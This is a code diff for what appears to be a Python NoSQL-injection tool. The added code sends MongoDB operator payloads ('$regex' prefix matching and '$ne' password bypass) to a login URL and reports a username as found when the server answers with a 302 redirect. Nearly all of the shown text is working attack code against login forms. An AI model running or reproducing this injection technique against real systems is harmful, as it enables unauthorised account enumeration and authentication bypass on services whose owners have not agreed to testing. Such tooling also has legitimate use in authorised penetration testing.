@@ -60,7 +60,22 @@ def process_payload(payload, characters, url, method, enum_parameter, password_p
                     except requests.exceptions.RequestException as e:
                         print(Fore.RED + "Error occurred during request:", e)
                         break
-            return userpass
+
+                # Check if the userpass is a valid username
+                para = {enum_parameter + '[$regex]': "^" + userpass + ".*", password_parameter + '[$ne]': '1' + other_parameters}
+                try:
+                    r = session.request(method=method, url=url, data=para, allow_redirects=False, timeout=10)
+                    r.raise_for_status()
+
+                    if r.status_code == 302:
+                        print(Fore.YELLOW + f"username found: {userpass}")
+                        return userpass
+
+                except requests.exceptions.RequestException as e:
+                    print(Fore.RED + "Error occurred during request:", e)
+
+            return None
+
     except requests.exceptions.RequestException as e:
         print(Fore.RED + "Error occurred during request:", e)
 
